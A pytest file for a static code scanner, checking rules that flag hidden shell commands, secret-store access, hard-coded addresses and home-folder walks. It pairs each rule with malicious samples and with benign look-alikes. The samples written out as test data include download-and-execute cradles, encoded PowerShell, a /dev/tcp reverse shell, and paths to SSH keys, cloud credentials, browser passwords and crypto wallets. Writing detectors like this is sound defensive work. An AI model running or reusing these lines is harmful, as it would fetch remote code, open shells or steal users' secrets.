"""S11-S14: hidden shell commands, secret stores, hard-coded addresses and home-folder walks.

Every sample is a line of text the scanner reads; nothing here is run. Each rule has
cases it must catch and look-alike legitimate code it must leave alone.
"""

import pytest

from app.static_scan.behaviors import check_hardcoded_ip, check_hidden_shell, check_home_walk, check_secret_stores
from app.static_scan.files import from_dict

CHECKS = {
    "S11": check_hidden_shell,
    "S12": check_secret_stores,
    "S13": check_hardcoded_ip,
    "S14": check_home_walk,
}


def status(rule, path, text):
    return CHECKS[rule](from_dict({path: text})).status


@pytest.mark.parametrize("path, text", [
    ("setup.py", 'subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", payload])'),
    ("install.bat", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
    ("run.ps1", "IEX (New-Object Net.WebClient).DownloadString('https://updates.example.invalid/a.ps1')"),
    ("run.ps1", "irm https://get.example.invalid/setup | iex"),
    ("tools/fix.cmd", "certutil -urlcache -split -f https://cdn.example.invalid/x.exe %TEMP%\\x.exe"),
    ("tools/fix.cmd", "bitsadmin /transfer job https://cdn.example.invalid/x.exe C:\\x.exe"),
    ("open.vbs", 'CreateObject("WScript.Shell").Run "mshta https://cdn.example.invalid/page.hta"'),
    ("package.json", '{"scripts": {"postinstall": "pwsh -ExecutionPolicy Bypass -File ./setup.ps1"}}'),
    ("index.js", "require('child_process').exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA=')"),
], ids=["py-list-args", "bat-encoded", "iex-download", "irm-pipe-iex", "certutil", "bitsadmin", "mshta",
        "npm-bypass", "node-encoded"])
def test_s11_catches_hidden_shell_commands(path, text):
    assert status("S11", path, text) == "hit"


@pytest.mark.parametrize("path, text", [
    ("build.ps1", "powershell -NoProfile -Command Get-Date"),
    ("Makefile.py", 'subprocess.run(["git", "status"], check=True)'),
    ("README.md", "Attackers often run `powershell -enc <base64>` to hide what they do."),
    ("scripts/ci.sh", "pwsh ./build.ps1 -Configuration Release"),
    ("docs/security.txt", "IEX (New-Object Net.WebClient).DownloadString(...) is a classic cradle"),
], ids=["plain-command", "git", "readme-mentions-it", "pwsh-script", "docs"])
def test_s11_leaves_ordinary_shell_use_alone(path, text):
    assert status("S11", path, text) == "clear"


@pytest.mark.parametrize("path, text", [
    ("collect.py", 'key = Path.home() / ".ssh/id_ed25519"'),
    ("sync.js", "const p = path.join(os.homedir(), '.aws/credentials')"),
    ("grab.py", r'chrome = os.path.join(LOCALAPPDATA, r"Google\Chrome\User Data\Default\Login Data")'),
    ("ext.js", "const ids = ['nkbihfbeogaeaoehlefnkodbefgpgknn', 'bfnaelmomeimhlpmgjnjophhpkkoljpa']"),
    ("w.py", 'paths = ["~/.config/solana/id.json", "~/Library/Application Support/Exodus/exodus.wallet"]'),
    ("mac.sh", "security find-generic-password -wa Chrome"),
], ids=["ssh-key", "aws", "chrome-passwords", "wallet-extensions", "solana-exodus", "keychain"])
def test_s12_catches_secret_stores(path, text):
    assert status("S12", path, text) == "hit"


@pytest.mark.parametrize("path, text", [
    ("deploy.py", 'config = Path.home() / ".ssh" / "config"'),
    ("README.md", "Add your key to ~/.ssh/id_ed25519 before you deploy."),
    ("cookies.js", "document.cookie = 'theme=dark'"),
], ids=["ssh-config-not-key", "docs", "browser-cookie-api"])
def test_s12_leaves_lookalikes_alone(path, text):
    assert status("S12", path, text) == "clear"


@pytest.mark.parametrize("path, text", [
    ("beacon.py", 's = socket.create_connection(("203.0.113.10", 8443), timeout=1)'),
    ("client.js", "const r = await fetch('http://147.124.212.125:1224/api/service/token')"),
    ("x.sh", "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"),
    ("shell.py", "import pty; pty.spawn('/bin/sh')"),
], ids=["socket-ip", "fetch-ip", "dev-tcp", "pty"])
def test_s13_catches_hard_coded_addresses_and_remote_shells(path, text):
    assert status("S13", path, text) == "hit"


@pytest.mark.parametrize("path, text", [
    ("server.py", 'app.run(host="0.0.0.0", port=8000)'),
    ("dev.js", "fetch('http://127.0.0.1:3000/health')"),
    ("db.py", 'conn = connect(host="10.0.0.12")'),
    ("package.json", '{"version": "1.2.3.4", "name": "x"}'),
    ("dns.js", "const fallback = '1.1.1.1'  // shown on the settings page"),
], ids=["bind-all", "loopback", "private", "version-number", "no-network-nearby"])
def test_s13_leaves_local_and_private_addresses_alone(path, text):
    assert status("S13", path, text) == "clear"


@pytest.mark.parametrize("path, text", [
    ("scan.py", "for root, dirs, names in os.walk(Path.home()):"),
    ("scan.py", "for root, _, names in os.walk(os.path.expanduser('~')):"),
    ("scan.py", "files = list(Path.home().rglob('*'))"),
    ("scan.js", "fs.readdirSync(os.homedir())"),
    ("scan.ps1", "Get-ChildItem $env:USERPROFILE -Recurse -Include *.json"),
    ("scan.sh", "find ~/ -name '*.pem'"),
], ids=["walk-home", "walk-expanduser", "rglob-home", "node-homedir", "powershell-recurse", "find-home"])
def test_s14_catches_walks_through_the_home_folder(path, text):
    assert status("S14", path, text) == "hit"


@pytest.mark.parametrize("path, text", [
    ("build.py", "for root, dirs, names in os.walk('src'):"),
    ("cfg.py", 'config_dir = Path.home() / ".myapp"'),
    ("ls.ps1", "Get-ChildItem ./dist -Recurse"),
], ids=["walk-project", "home-config-file", "recurse-project"])
def test_s14_leaves_project_walks_alone(path, text):
    assert status("S14", path, text) == "clear"


def test_s13_points_at_the_connection_not_at_a_comment():
    text = '"""Talks to 203.0.113.0/24 over a socket."""\nimport socket\n\nsocket.create_connection(("203.0.113.10", 8443))\n'
    ev = check_hardcoded_ip(from_dict({"c.py": text})).evidence[0].summary
    assert "203.0.113.10" in ev and "line 4" in ev


def test_the_evidence_names_the_file_and_line():
    files = from_dict({"a.py": "import os\n\nfor r, d, f in os.walk(Path.home()):\n    pass\n"})
    ev = check_home_walk(files).evidence[0].summary
    assert ev.startswith("os.walk over the home folder in a.py, line 3:")
